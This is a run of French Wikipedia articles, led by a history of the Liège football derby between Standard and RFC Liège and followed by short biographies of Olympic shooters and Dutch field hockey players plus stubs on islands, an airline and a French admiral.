Le derby de Liège est une rencontre de football opposant le Standard de Liège et le RFC Liège, les deux principales équipes de la ville de Liège. Il s'agit de l'une des rivalités le plus vielle et les plus intenses de Belgique.
Les premières confrontations en championnat de Belgique ont lieu lors de la saison 1909-1910 et se concluent toutes les deux sur un score nul.
Historique de la rivalité.
L'origine de la rivalité entre le Standard et le FC Liégeois est antérieure à l'arrivée du football en Belgique. Elle s'inscrit en effet dans ce que l'on appelle la pilarisation de la société belge et oppose, dans ce cas si, le pan catholique au pan libéral. Ainsi, pour l'historien Julien Demolin, la rivalité entre les deux clubs principautaire est tout simplement la continuité de celle opposant les étudiants "catholiques" du Collège Saint-Servais à ceux "laïcs" de l'Athénée royal de Liège. Il pouvait y avoir en effet des grosses tensions entre les étudiants se terminant parfois en bagarre dans le centre ville. Les étudiants de l'Athénée s'amusait à dénommé ceux de Saint-Servais de "Sal singe" tandis que ceux du Collège les surnommait en retour "les apprentis ramoneurs". 
À l'instar de bien d'autres endroits dans le monde, la Ville de Liège et sa région découvrirent le football, grâce à la présence de nombreux cadres et ouvriers anglais, qui contribuaient, depuis le milieu du , à l'installation et au développement du bassin industriel liégeois. C'est sous l'influence de ces Anglais que de très jeunes élèves anglais, étudiant à l'Athénée royal de Liège, importèrent le football à Liège.
La ville de Liège fut alors le berceau du football wallon puisque le premier club de Football en Wallonie fut le Football Club Liégeois fondé en 1892, c'est le quatrième plus vieux club de Belgique, il fut créé par des membres du Liege Cyclist's Union qui avaient organisé la même année la de Liège-Bastogne-Liège (appelée alors « Liège-Bastogne et retour ») (L'organisation de la deuxième édition de « La Doyenne » fut confiée au Pesant Club Liégeois), ils cherchaient un sport « d'hiver » pour maintenir leur forme physique en attendant le printemps. On considère que le RFC Liège est bien représentatif du sport liégeois en général.
Le FC liégeois, surnommé le « Old club » ou plus populairement les « Sang &amp; Marine » participèrent à la toute première édition du Championnat de Belgique lors d'une saison 1895/1896 que les Liégeois remportèrent, devenant le premier Champion de Belgique de l'Histoire.
Le Club Liégeois ne réédita pas l'exploit la saison suivante, terminant deuxième à quatre points du premier, le Racing.
Le FC Liège ne s'en laisse pas conter et remporte deux autres éditions du Championnat les deux saisons qui suivirent (1897/1898 &amp; 1898/1899). Il se voient délivrer alors la Coupe du Championnat par la Fédération.
En 1899, une partie des supporters du FC liégeois, principalement un groupe d'élèves du collège Saint-Servais décidèrent de quitter le club et de créer leur propre équipe. À l'issue d'un vote pour déterminer le nom du club, le « Standard » l'emporte, d'une seule voix, devant le « Skill ». Le nom du club naissant est inspiré de celui du Standard A.C., club parisien populaire à l'époque. Le club s'appelle d'abord le Standard Football Club Liégeois avant de devenir le S.C.L. (Standard Club Liégeois), les joueurs choisissent pour couleurs le Rouge et le Blanc, des couleurs qui en fait sont à l'origine les couleurs des maillots de leur première partie, des maillots... prêtés par le Football Club Liégeois.
Les premières confrontations en Championnat de Belgique ont lieu lors de la saison 1909/1910 et se concluent toutes les deux sur un score nul et vierge.
Par la suite, les deux clubs descendent en division 2 mais le Standard de Liège parvient à retrouver l'élite tout comme le FC Liège mais qui contrairement au Standard, ne parvient pas à se maintenir et se retrouva même division 3.
Alors que les résultats du Standard restaient stables, le RFC Liège qui évoluait en Division 3, en 1942/43, retrouve la Division d’Honneur en 1944/1945 grâce à deux montées successives.
Dans les années 1950, ce sont les Sang &amp; Marine qui sont au sommet de la hiérarchie du Football Belge puisqu'ils reviennent en puissance avec un quatrième titre de championnat en 1951/1952, une cinquantaine d'années après leur dernier, le club réalisa même le doublé en remportant leur cinquième sacre en 1952/1953.
Puis ce fut au tour du Royal Standard Club Liégeois de se mettre au devant de la scène en remportant son premier sacre, la Coupe de Belgique de 1954 puis son premier titre de Champion en 1957/1958.
Entre les années 1960 et les années 1980, le Standard vit son Âge d'Or. Les Mosans remportèrent en tout treize titres, à savoir sept titres de Champion de Belgique mais aussi trois Coupes de Belgique, deux Supercoupes de Belgique ainsi qu'une Coupe de la Ligue pro que remporta également le RFC Liège en 1986. 
Mais ces résultats sont entachés par l'affaire Standard-Waterschei en 1981/1982.
Dans les années 1990, Liège vit plusieurs épopées européennes alors que le Standard de Liège truste la seconde partie de tableau mais les Derbys restent très disputés.
En 1994/1995, le RFC Liège est confronté à de graves problèmes financiers, il doit d'abord quitter le Stade de Rocourt en cours de saison avant d'être relégué sportivement en D2 puis administrativement en division 3 à cause d'un problème de cession de patrimoine jugée non conforme par l'Union Belge. 
Le célèbre Matricule 4, doit entamer une procédure de fusion avec un autre club, le Royal Football Club Tilleur-Saint-Nicolas qui évoluait alors division 3. Massivement opposés à cette fusion, les supporters eurent indirectement gain de cause puisque l'Union Belge la déclara non conforme, entraînant la disparition du Matricule 21 de Tilleur au profit du maintien de celui de Liège (4). Néanmoins, le club ainsi formé se nomme Royal Tilleur Football Club Liégeois (RTFCL) évolue au stade de Buraufosse remontera directement en D2.
Le nom du club redevient RFC Liège quand il déménage au stade du Pairay à Seraing. Après plusieurs années d'exil, le RFC Liége est retourné sur ses terres historiques à Rocourt où il occupe un stade temporaire en attendant la construction de son stade « définitif », sur le site de l'ancienne Caserne Militaire, rue de la Tonne.
Depuis le 120ème Derby disputé en 1994/1995, les deux formations ne se sont plus jamais rencontrées qu'à l'occasion de matchs « amicaux » d'avant saison sur terrain neutre mais ces rencontres ne sont plus organisées vu le coût des mesures de sécurité demandées par les Bourgmestres.
Le vendredi 7 janvier 2022, profitant de la trêve en Jupiler Pro League et de l'arrêt temporaire du Championnat de Nationale 1 pour cause de rebond de la Pandémie Covid 19, les deux équipes se sont rencontrées à Sclessin pour une joute amicale à huis clos qui s'est terminée sur le score de 2-2.
Liège attend impatiemment le retour d'un vrai Derby entre Rouches et Sang &amp; Marine
Palmarès.
"Mis à jour le 30 mai 2018."
Localisation des clubs liégeois.
Les deux cercles liégeois sont :(1) Royal Football Club de Liège(8) Standard de Liège

</doc>
<doc id="9626241" url="https://fr.wikipedia.org/wiki?curid=9626241" title="Blue House">
Blue House



</doc>
<doc id="9626247" url="https://fr.wikipedia.org/wiki?curid=9626247" title="Liste d'artistes de nu metal">
Liste d'artistes de nu metal

La liste qui suit comprend des artistes de nu metal, ainsi que des artistes associés avec le genre à un moment ou un autre de leur carrière.

</doc>
<doc id="9626250" url="https://fr.wikipedia.org/wiki?curid=9626250" title="Locketia">
Locketia



</doc>
<doc id="9626251" url="https://fr.wikipedia.org/wiki?curid=9626251" title="C/2004 Q2">
C/2004 Q2



</doc>
<doc id="9626252" url="https://fr.wikipedia.org/wiki?curid=9626252" title="Renata Mauer-Rozanska">
Renata Mauer-Rozanska



</doc>
<doc id="9626253" url="https://fr.wikipedia.org/wiki?curid=9626253" title="C/2007 E2">
C/2007 E2



</doc>
<doc id="9626254" url="https://fr.wikipedia.org/wiki?curid=9626254" title="Liste des matchs de l'équipe de Mongolie de football par adversaire">
Liste des matchs de l'équipe de Mongolie de football par adversaire

Cette liste présente les matchs de l'équipe de Mongolie de football par adversaire rencontré.
A.
Afghanistan.
Confrontations entre la Mongolie et l'Afghanistan :
En une confrontation, la Mongolie n'a pas remporté de victoire, contre une pour l'Afghanistan.
Arabie saoudite.
Confrontations entre la Mongolie et l'Arabie saoudite :
En deux confrontations, la Mongolie n'a pas remporté de victoire, contre deux pour l'Arabie saoudite.
B.
Bangladesh.
Confrontations entre la Mongolie et le Bangladesh :
En deux confrontations, la Mongolie n'a pas remporté de victoire, contre une pour le Bangladesh.
Bhoutan.
Confrontations entre la Mongolie et le Bhoutan :
En une confrontation, la Mongolie n'a pas remporté de victoire, mais le Bhoutan non plus.
Birmanie.
Confrontations entre la Mongolie et la Birmanie :
En trois confrontations, la Mongolie a remporté une victoire, contre deux pour la Birmanie.
Brunei.
Confrontations.
Confrontations entre Brunei et la Mongolie :
Bilan.
Au :
C.
Corée du Nord.
Confrontations entre la Mongolie et la Corée du Nord :
En quatre confrontations, la Mongolie n'a pas remporté de victoire, contre quatre pour la Corée du Nord.
Corée du Sud.
Confrontations entre la Mongolie et la Corée du Sud :
En une confrontation, la Mongolie n'a pas remporté de victoire, contre une pour la Corée du Sud.
G.
Guam.
Confrontations entre la Mongolie et le Guam :
En six confrontations, la Mongolie a remporté quatre victoires, contre deux pour le Guam.
H.
Hong Kong.
Confrontations entre la Mongolie et Hong Kong :
En deux confrontations, la Mongolie n'a pas remporté de victoire, contre deux pour Hong Kong.
J.
Japon.
Confrontations entre la Mongolie et Japon :
En deux confrontations, la Mongolie n'a pas remporté de victoire, contre deux pour Japon.
K.
Koweït.
Confrontations entre la Mongolie et le Koweït :
En une confrontation, la Mongolie n'a pas remporté de victoire, contre une pour le Koweït.
Kirghizistan.
Confrontations.
Confrontations entre la Mongolie et le Kirghizistan :
Bilan.
Au :
L.
Laos.
Confrontations entre la Mongolie et le Laos :
En trois confrontations, la Mongolie n'a pas remporté de victoires, contre deux pour le Laos.
M.
Macao.
Confrontations entre la Mongolie et Macao :
En neuf confrontations, la Mongolie a remporté trois victoires, contre cinq pour Macao.
Maldives.
Confrontations entre la Mongolie et les Maldives :
En deux confrontations, la Mongolie n'a pas remporté de victoire, contre deux pour les Maldives.
O.
Ouzbékistan.
Confrontations entre la Mongolie et l'Ouzbékistan :
En deux confrontations, la Mongolie n'a pas remporté de victoire, contre deux pour l'Ouzbékistan.
P.
Philippines.
Confrontations entre la Mongolie et les Philippines :
En deux confrontations, la Mongolie n'a pas remporté de victoire, contre une pour les Philippines.
S.
Sri Lanka.
Confrontations entre la Mongolie et le Sri Lanka :
En deux confrontations, les deux équipes se sont chacune imposées à une reprise.
T.
Taipei chinois.
Confrontations entre la Mongolie et Taipei chinois :
En quatre confrontations, la Mongolie n'a pas remporté de victoire, deux pour Taipei chinois.
Timor oriental.
Confrontations entre la Mongolie et le Timor oriental :
En deux confrontations, la Mongolie n'a pas remporté de victoire, contre deux pour le Timor oriental.
V.
Viêt Nam.
Confrontations entre la Mongolie et le Viêt Nam :
En deux confrontations, la Mongolie n'a pas remporté de victoire, contre deux pour le Viêt Nam.

</doc>
<doc id="9626255" url="https://fr.wikipedia.org/wiki?curid=9626255" title="C/2011 W3">
C/2011 W3



</doc>
<doc id="9626261" url="https://fr.wikipedia.org/wiki?curid=9626261" title="Sean Dillon">
Sean Dillon



</doc>
<doc id="9626267" url="https://fr.wikipedia.org/wiki?curid=9626267" title="Jasna Šekarić">
Jasna Šekarić

Jasna Šekarić, née le à Belgrade, est une tireuse sportive serbe.
Carrière.
Jasna Šekarić remporte sous les couleurs de la Yougoslavie la médaille d'or en pistolet à air comprimé à 10 mètres et la médaille de bronze en pistolet sportif à 25 mètres aux épreuves de tir aux Jeux olympiques d'été de 1988 se tenant à Séoul.
Aux Jeux olympiques d'été de 1992 à Barcelone, c'est en tant qu'participante olympique indépendante qu'elle est médaillée d'argent en pistolet à air comprimé à 10 mètres.
Aux Jeux olympiques d'été de 2000 à Sydney et aux Jeux olympiques d'été de 2004 à Athènes, elle remporte l'argent en pistolet à air comprimé à 10 mètres.
Elle est le porte-drapeau de la Serbie aux Jeux olympiques d'été de 2008.

</doc>
<doc id="9626275" url="https://fr.wikipedia.org/wiki?curid=9626275" title="Jasna Sekaric">
Jasna Sekaric



</doc>
<doc id="9626276" url="https://fr.wikipedia.org/wiki?curid=9626276" title="Destination 3001">
Destination 3001

Destination 3001 est une anthologie de vingt nouvelles de science-fiction réunies par Robert Silverberg et Jacques Chambon, publiée en .
Les nouvelles ont pour thème commun l'être humain, ou la civilisation humaine, en l'an 3000.
Les auteurs de ces nouvelles sont huit Américains, sept Français, deux Britanniques, deux Italiens et un Allemand.
Publications.
Publication en France.
"Destination 3001" a été publié en France en aux éditions Flammarion, dans la collection "Imagine".
L'ouvrage a été réédité en 2003 chez J'ai lu, .
Publication en Italie.
Le recueil a aussi été publié en Italie dans le numéro 1490 de la revue "Urania"(page de couverture).
Partie littéraire.
"Les pages indiquées dans les mentions « Situation dans le recueil » sont celles de l'édition parue chez J'ai lu en 2003".

</doc>
<doc id="9626278" url="https://fr.wikipedia.org/wiki?curid=9626278" title="Saarihiihto">
Saarihiihto

Saarihiihto est une compétition de ski de fond organisée dans le golfe de Finlande. Le tracé s'est peu à peu étendu à la ville de Virolahti. La première édition de la course a eu lieu en 2003 lorsque le but était d'atteindre l'île de Paatio.
Pour des raisons météorologiques, les éditions 2007 et 2008 ont été annulées. En 2009 et 2011, le parcours est passé du côté finlandais.

</doc>
<doc id="9626285" url="https://fr.wikipedia.org/wiki?curid=9626285" title="Maria Grozdeva">
Maria Grozdeva

Maria Grozdeva, née le à Sofia, est une tireuse sportive bulgare.
Carrière.
Maria Grozdeva remporte la médaille de bronze en pistolet à air comprimé à 10 mètres aux Jeux olympiques d'été de 1992 à Barcelone, aux Jeux olympiques d'été de 1996 à Atlanta et aux Jeux olympiques d'été de 2004 à Athènes. 
En 2000 et en 2004, elle est sacrée championne olympique en pistolet sportif à 25 mètres.
Elle est le porte-drapeau de la Bulgarie aux Jeux olympiques d'été de 2004.

</doc>
<doc id="9626290" url="https://fr.wikipedia.org/wiki?curid=9626290" title="Musée des Hospices civils de Lyon">
Musée des Hospices civils de Lyon

Le musée des Hospices civils de Lyon est un musée scientifique, d'art et d'histoire dépendant des Hospices civils de Lyon, CHU de Lyon. Ouvert en 1935 au sein de l'Hôtel-Dieu de Lyon, il a fermé ses portes aux publics en .
Historique.
À la suite de la destruction de l'hôpital de la Charité de Lyon, trois salles classées monuments historiques doivent être conservées : l'apothicairerie, les salles d'archives et du conseil. C'est dans cet objectif de conservation et de valorisation des dons et legs reçus par les HCL qu'Émile Delore, membre du conseil d'administration, créé le musée des Hospices civils de Lyon en 1935. Installé dans l'un des rangs de l'hôpital du , il fut agrandi avec l'ouverture en 1976 d'une nouvelle salle consacrée à la médecine.
Collections.
Le musée conserve des collections liées à la santé , aux arts et à l'histoire.

</doc>
<doc id="9626292" url="https://fr.wikipedia.org/wiki?curid=9626292" title="Daina Gudzinevičiūtė">
Daina Gudzinevičiūtė

Daina Gudzinevičiūtė, née le à Vilnius, est une tireuse sportive lituanienne.
Carrière.
Daina Gudzinevičiūtė remporte la médaille d'or en trap féminin aux Jeux olympiques d'été de 2000 à Sydney.

</doc>
<doc id="9626293" url="https://fr.wikipedia.org/wiki?curid=9626293" title="Daina Gudzineviciute">
Daina Gudzineviciute



</doc>
<doc id="9626296" url="https://fr.wikipedia.org/wiki?curid=9626296" title="Paatio">
Paatio

Paatio (, "Bolšoi Pogranitšnyi") est une île du golfe de Finlande située dans le raïon de Vyborg (oblast de Leningrad, Russie), à la frontière entre la Finlande et la Russie.
Géographie.
L'île couvre une superficie d'environ 800 hectares.
Du côté finlandais, l'île la plus proche est celle de Rääntiö.
Histoire.
Avant la Seconde Guerre mondiale, Paatio faisait partie de la municipalité finlandaise de Virolahti. En 1944, conformément à l'armistice de Moscou, l'Union soviétique en prit possession ainsi que des îles adjacentes de Paju et Papin.
Au début de la guerre d'Hiver, l'île comptait 57 bâtiments résidentiels pour 270 habitants. Les autorités russes délivrent des permis aux étrangers pour visiter l'île.

</doc>
<doc id="9626303" url="https://fr.wikipedia.org/wiki?curid=9626303" title="Richard Faulds">
Richard Faulds

Richard Bruce Faulds, né le à Guildford, est un tireur sportif britannique.
Carrière.
Richard Faulds remporte la médaille d'or en double trap aux Jeux olympiques d'été de 2000 à Sydney.

</doc>
<doc id="9626311" url="https://fr.wikipedia.org/wiki?curid=9626311" title="Mykola Milchev">
Mykola Milchev

Mykola Mykolaiovych Milchev, né le à Odessa, est un tireur sportif ukrainien.
Carrière.
Mykola Milchev remporte la médaille d'or en skeet aux Jeux olympiques d'été de 2000 à Sydney.

</doc>
<doc id="9626314" url="https://fr.wikipedia.org/wiki?curid=9626314" title="Zemfira Meftahatdinova">
Zemfira Meftahatdinova

Zemfira Meftahatdinova, née le à Bakou, est une tireuse sportive azerbaïdjanaise.
Carrière.
Zemfira Meftahatdinova remporte la médaille d'or en skeet aux Jeux olympiques d'été de 2000 à Sydney, puis la médaille de bronze aux Jeux olympiques d'été de 2004 à Athènes. Aux Jeux olympiques d'été de 2008 à Pékin, elle termine à la quinzième place.

</doc>
<doc id="9626323" url="https://fr.wikipedia.org/wiki?curid=9626323" title="Zemfira Meftakhetdinova">
Zemfira Meftakhetdinova



</doc>
<doc id="9626327" url="https://fr.wikipedia.org/wiki?curid=9626327" title="Nordica (compagnie aérienne)">
Nordica (compagnie aérienne)

Nordica est le nom commercial depuis le de Nordic Aviation Group (NAG), une compagnie aérienne gouvernementale estonienne qui, à partir du , reprend huit destinations de Estonian Air, compagnie qui a fait faillite et cessé ses opérations la veille. Son président est Jan Palmer. Cette compagnie n'est pas un successeur légal d'Estonian Air. Cette compagnie ne possédait pas encore de flotte ou de personnel en propre et ses vols étaient effectués par des avions et du personnel d'autres compagnies, notamment NextJet, bmi et Carpatair. Un avion avec un équipage estonien est prévu début 2016. C'est Adria Airways qui lui fournit le certificat de transporteur aérien et le système de billetterie. Adria fournit également le code AITA, JP. Les avions affrétés sont des Embraer 145, des Fokker 100 et des British Aerospace ATP.
Flotte.
En janvier 2023, la flotte de Nordica se compose des appareils suivants :
Destinations.
Les aéroports suivants font partie des destinations directes à partir de l'aéroport international de Tallinn :
Nice et Split sont desservies depuis l'été 2016.

</doc>
<doc id="9626332" url="https://fr.wikipedia.org/wiki?curid=9626332" title="Christiaens">
Christiaens



</doc>
<doc id="9626334" url="https://fr.wikipedia.org/wiki?curid=9626334" title="Vous serez ma femme">
Vous serez ma femme

Vous serez ma femme est un film allemand de comédie réalisé par Carl Boese, Serge de Poligny et Heinz Hille, sorti en 1932 et mettant en vedette Alice Field, Roger Tréville et Lucien Baroux.
Le film est la version en langue française de "" de l'UFA.
Les décors du film ont été conçus par les directeurs artistiques Willi Herrmann et Herbert Lippschitz.

</doc>
<doc id="9626339" url="https://fr.wikipedia.org/wiki?curid=9626339" title="Rääntiö">
Rääntiö

Rääntiö est une île du golfe de Finlande située dans la municipalité de Virolahti. L'île se trouve à proximité de l'île de Paatio qui passa sous souveraineté soviétique après l'armistice de Moscou en 1944.
La frontière entre la Finlande et la Russie passe près de l'île, sur Koiluoto.

</doc>
<doc id="9626341" url="https://fr.wikipedia.org/wiki?curid=9626341" title="Lucille Opitz">
Lucille Opitz

Lucille Opitz, née le à Berlin, est une patineuse de vitesse allemande. 

</doc>
<doc id="9626342" url="https://fr.wikipedia.org/wiki?curid=9626342" title="Friso Nijboer">
Friso Nijboer

Friso Nijboer est un joueur d'échecs néerlandais né le . Grand maître international depuis 1996, il a représenté les Pays-Bas lors de six olympiades (de 1996 à 2002) et de quatre championnats d'Europe par équipe, remportant une médaille d'or par équipe et une médaille d'or individuelle lors du championnat d'Europe 2001 (il jouait comme remplaçant).
Il a remporté les tournois de Wijk aan Zee B en 1989, 1994 ("ex æquo" avec Lars Bo Hansen), 1997 ("ex æquo" avec Paul van der Sterren). Il fut deuxième du championnat d'échecs des Pays-Bas en 1993 et 2009 et troisième "ex æquo" en 1996, 2006, 2007 et 2009.
Publications.
Avec A. C. Van der Tak :
Avec Geert Van der Stricht :

</doc>
<doc id="9626344" url="https://fr.wikipedia.org/wiki?curid=9626344" title="Opitz">
Opitz



</doc>
<doc id="9626356" url="https://fr.wikipedia.org/wiki?curid=9626356" title="Université de l’Alabama">
Université de l’Alabama



</doc>
<doc id="9626358" url="https://fr.wikipedia.org/wiki?curid=9626358" title="Underwear">
Underwear



</doc>
<doc id="9626359" url="https://fr.wikipedia.org/wiki?curid=9626359" title="Fatima Moreira de Melo">
Fatima Moreira de Melo

Fatima Moreira de Melo (née le à Rotterdam) est une joueuse de hockey sur gazon néerlandaise, sélectionnée en équipe des Pays-Bas de hockey sur gazon féminin à 257 reprises. 
Hockey sur gazon.
Elle est sacrée championne olympique en 2008, obtient la médaille d'argent olympique en 2004 et remporte la médaille de bronze aux Jeux olympiques d'été de 2000. Elle est aussi championne du monde en 2006 et vice-championne du monde en 1998 et en 2002.
Poker.
À 30 ans, Fatima arrête sa carrière de hockeyeuse, juste après les Jeux Olympiques de Pékin de 2008. Elle entame par la suite une carrière de joueuse de poker et, en 2009, enregistre ses premiers résultats en tournois sur le circuit international.
En 2013, elle finit du "1k£ UK &amp; Ireland Poker Tour" sur l'Ile de Man et empoche , son plus gros gain en tournoi.
En 2017, elle remporte le tournoi Ladies du PokerStars Championship devant 24 concurrentes
Fin 2018, Fatima cumule plus de de gain en tournois live.

</doc>
<doc id="9626364" url="https://fr.wikipedia.org/wiki?curid=9626364" title="Kiritani Mirei">
Kiritani Mirei



</doc>
<doc id="9626369" url="https://fr.wikipedia.org/wiki?curid=9626369" title="Eva de Goede">
Eva de Goede

Eva de Goede (épouse Drummond) (née le à Zeist) est une joueuse de hockey sur gazon néerlandaise, sélectionnée en équipe des Pays-Bas de hockey sur gazon féminin à 149 reprises au 10 décembre 2015. 
Elle est sacrée championne olympique en 2008, en 2012 et en en 2020. Elle est aussi vice-championne olympique en 2016, championne du monde en 2014 et 2018, vice-championne du monde en 2010, championne d'Europe en 2009, 2011, 2019 et 2021 et vice-championne d'Europe en 2015.

</doc>
<doc id="9626375" url="https://fr.wikipedia.org/wiki?curid=9626375" title="Ellen Hoog">
Ellen Hoog

Ellen Marijn Hoog (née le à Bloemendaal) est une joueuse de hockey sur gazon néerlandaise, sélectionnée en équipe des Pays-Bas de hockey sur gazon féminin à 204 reprises au 10 décembre 2015. 
Elle est sacrée championne olympique en 2008 et en 2012. Elle est aussi championne du monde en 2006 et 2014, vice-championne du monde en 2010, championne d'Europe en 2005, 2009 et 2011 et vice-championne d'Europe en 2007 et 2015.

</doc>
<doc id="9626376" url="https://fr.wikipedia.org/wiki?curid=9626376" title="Centre scientifique d'oncologie Nikolaï Blokhine">
Centre scientifique d'oncologie Nikolaï Blokhine

Le Centre scientifique d'oncologie Nikolaï Blokhine (en ) est un organisme de recherche russe à but non lucratif soumis au Ministère de la Santé, qui se consacre à l'étude du cancer et poursuit le travail de l'ancien Institut de la pathologie expérimentale et de la thérapie du cancer de l'Académie des sciences d'URSS fondé par un décret du Conseil des ministres de l'URSS le . Il s'agit du même établissement qui a été réorganisé après la dislocation de l'URSS. Il est ainsi nommé d'après le chirurgien-cancérologue, membre de l'Académie des sciences d'URSS , l'un de ses fondateurs. Depuis 2001, son directeur est le professeur Mikhaïl Davydov. Le centre est composé de cinq départements de la recherche: l'Institut d'oncologie clinique, l'Institut de diagnostic expérimental et thérapie des cancers, l'Institut de cancérogenèse, l'Institut d'oncologie pédiatrique et hématologie, l'Institut de radiologie clinique et expérimentale. L'établissement fait partie de l'Union internationale contre le cancer. 

</doc>
<doc id="9626381" url="https://fr.wikipedia.org/wiki?curid=9626381" title="Miek van Geenhuizen">
Miek van Geenhuizen

Miek van Geenhuizen (née le à Eindhoven) est une joueuse de hockey sur gazon néerlandaise, sélectionnée en équipe des Pays-Bas de hockey sur gazon féminin à 164 reprises. 
Elle est sacrée championne olympique en 2008 et obtient la médaille d'argent olympique en 2004 . Elle est aussi championne du monde en 2006, vice-championne du monde en 2002 et vice-championne d'Europe en 2007.

</doc>
<doc id="9626382" url="https://fr.wikipedia.org/wiki?curid=9626382" title="Josie and the Pussycats (film)">
Josie and the Pussycats (film)



</doc>
<doc id="9626384" url="https://fr.wikipedia.org/wiki?curid=9626384" title="Minke Smeets">
Minke Smeets

Minke Smeets (née Smabers le à La Haye) est une joueuse de hockey sur gazon néerlandaise, sélectionnée en équipe des Pays-Bas de hockey sur gazon féminin à 312 reprises. 
Biographie.
Elle est la sœur de la joueuse de hockey sur gazon Hanneke Smabers et la femme du joueur de baseball .
Palmarès.
Elle est sacrée championne olympique en 2008, obtient la médaille d'argent olympique en 2004 et la médaille de bronze olympique en 2000. Elle est aussi championne du monde en 2006, vice-championne du monde en 1998, 2002 et 2006, championne d'Europe en 1999 et 2005 et vice-championne d'Europe en 2007.
Elle met un terme à sa carrière internationale en , avec un total de 312 sélections et 23 buts marqués ; elle est la première Néerlandaise à dépasser la barre des 300 sélections.

</doc>
<doc id="9626385" url="https://fr.wikipedia.org/wiki?curid=9626385" title="Minke Smabers">
Minke Smabers



</doc>
<doc id="9626389" url="https://fr.wikipedia.org/wiki?curid=9626389" title="Hanneke Smabers">
Hanneke Smabers

Hanneke Smabers (née le à La Haye) est une joueuse de hockey sur gazon néerlandaise, sélectionnée en équipe des Pays-Bas de hockey sur gazon féminin à 127 reprises. 
Elle obtient la médaille de bronze olympique en 2000. Elle est aussi vice-championne du monde en 1998 et championne d'Europe en 1999.
Elle est la sœur de la joueuse de hockey sur gazon Minke Smabers.

</doc>
<doc id="9626393" url="https://fr.wikipedia.org/wiki?curid=9626393" title="Liste des cours d'eau de l'Ain">
Liste des cours d'eau de l'Ain

Liste des fleuves, rivières et autres cours d'eau qui parcourent en partie ou en totalité le département de l'Ain. La liste présente les cours d'eau, généralement de plus de de longueur sauf exceptions, par ordre alphabétique, par fleuves et bassin versant, par station hydrologique, puis par organisme gestionnaire ou organisme de bassin.
Classement par fleuve et bassin versant.
Le seul fleuve traversant le département Ain est le Rhône, dont les affluents principaux traversant le même département sont l'Ain et la Saône.
Hydrologie ou station hydrologique.
la Banque Hydro a référencé les cours d'eau suivants : 

</doc>
<doc id="9626394" url="https://fr.wikipedia.org/wiki?curid=9626394" title="Janneke Schopman">
Janneke Schopman

Janneke Schopman (née le à Haarlem) est une joueuse de hockey sur gazon néerlandaise, sélectionnée en équipe des Pays-Bas de hockey sur gazon féminin à 212 reprises. 
Elle est sacrée championne olympique en 2008 et obtient la médaille d'argent olympique en 2004 . Elle est aussi championne du monde en 2006, vice-championne du monde en 2002 et 2010, championne d'Europe en 2005 et vice-championne d'Europe en 2007.

</doc>
<doc id="9626401" url="https://fr.wikipedia.org/wiki?curid=9626401" title="Wieke Dijkstra">
Wieke Dijkstra

Wieke Dijkstra (née le à Amsterdam) est une joueuse de hockey sur gazon néerlandaise, sélectionnée en équipe des Pays-Bas de hockey sur gazon féminin à 123 reprises. 
Elle est sacrée championne olympique en 2008. Elle est aussi championne du monde en 2006, vice-championne du monde en 2010 et vice-championne d'Europe en 2007.

</doc>
<doc id="9626405" url="https://fr.wikipedia.org/wiki?curid=9626405" title="Marilyn Agliotti">
Marilyn Agliotti

Marilyn Agliotti (née le à Boksburg) est une joueuse de hockey sur gazon sud-africaine ayant acquis la nationalité néerlandaise en . Elle est sélectionnée en équipe d'Afrique du Sud de hockey sur gazon féminin, puis en équipe des Pays-Bas de hockey sur gazon féminin à 109 reprises. 
Elle est sacrée championne olympique en 2008 et en 2012. Elle est aussi vice-championne du monde en 2010, championne d'Europe en 2011 et vice-championne d'Europe en 2007.

</doc>
<doc id="9626408" url="https://fr.wikipedia.org/wiki?curid=9626408" title="Lusoga">
Lusoga



</doc>
<doc id="9626415" url="https://fr.wikipedia.org/wiki?curid=9626415" title="Billy Sunday">
Billy Sunday

William Ashley "Billy" Sunday, né à Ames (Iowa) le et mort à Chicago le , est un joueur américain de baseball qui, après avoir été un voltigeur populaire dans la Ligue nationale de baseball durant les années 1880, est devenu l'évangéliste américain le plus célèbre et le plus influent durant les deux premières décennies de .

</doc>
<doc id="9626417" url="https://fr.wikipedia.org/wiki?curid=9626417" title="Billy « Dimanche »">
Billy « Dimanche »



</doc>
<doc id="9626418" url="https://fr.wikipedia.org/wiki?curid=9626418" title="Yves Le Coat de Saint-Haouen">
Yves Le Coat de Saint-Haouen

Yves-Marie Gabriel Pierre Le Coat, baron de Saint-Haouen, né le samedi à Brest et mort à Calais le mardi à midi, est un contre-amiral français qui fut chef d'état-major des amiraux Latouche-Tréville et Bruix, ainsi que chef militaire du Camp de Boulogne. Il est principalement connu pour avoir mis au point un système de télégraphe terrestre et maritime, concurrent de celui de Chappe, qui a pour particularité d'être le premier utilisable de jour comme de nuit, le Télégraphe Saint-Haouen , ainsi que pour ses travaux précurseurs sur les phares et la signalisation maritime côtière. Il est décrit comme ayant un "caractère difficile et impérieux" et comme affectant "un air de prétention dans le service".
Famille et origines.
Les Le Coat sont originaires de la paroisse de Saint-Renan dans le bas-Léon. On y retrouve en 1500 un Jean Le Coat qui s'occupe du commerce des draps. Par la suite ses descendants sont avocats, et occupent la charge de notaire royal et de procureur du Roy.
Jean Le Coat, notaire royal en 1710, épouse Jeanne le Run de Saint-Haouen, issue des Le Run de Keruzas, dont le premier représentant, Bernard, fut anoblis le 21 novembre 1425 par Jean V de Bretagne, au cours d'une cérémonie célébrée par l'évêque de Léon Philippe de Coetquis.
Leur fils Yves, notaire et procureur à Brest en 1726, sera le premier à adjoindre à son nom celui de la terre noble située au nord de Plougonvelin dont il hérite de par sa mère. De son mariage avec Jeanne le Milbeo de Kerloguer, issue des Milbeo de Rubihan, des Bizien des Penarprat et des Bizien de Kervilly, est né Jacques-Yves Le Coat de Saint-Haouen, père de Yves Le Coat de Saint-Haouen. Denis Le Coat de Kervéguen, père de Gabriel Le Coat de Kerveguen descend de l'oncle de Jacques-Yves Le Coat de Saint-Haouen. Yves le coat de Saint-Haouen est le grand-père de Ferdinand Gautier.
Il épouse le Louise-Félicité Chaspoul (1781-1842) à Paris.
Officier dans la royale.
Service Sur la Belle Poule (1770-1779).
Premier voyage aux Antilles.
